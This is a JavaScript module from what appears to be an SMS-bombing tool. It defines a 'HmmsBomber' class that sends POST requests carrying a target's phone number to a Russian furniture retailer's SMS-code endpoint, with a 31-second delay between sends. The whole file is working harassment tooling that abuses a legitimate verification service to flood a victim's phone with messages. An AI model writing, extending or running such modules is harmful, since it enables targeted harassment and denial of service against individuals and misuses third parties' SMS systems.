const Bomber = require("../bomber");
const requestTypes = require("../../data-structures/requestTypes");

class HmmsBomber extends Bomber {
    constructor(phone){
        super(phone);
        this.data = this.formUrlEncoded({
            "action": "sendSmsCode",
            "arFields[phone]": this.phone
        });
    }
    headers = {
    }
    requestType = requestTypes.post;
    static country = "RU";
    siteName = "hmms";
    delay = 31000;
    url = 'https://hypermarketmebel.ru/ajax/identification.php';  
}
module.exports = HmmsBomber;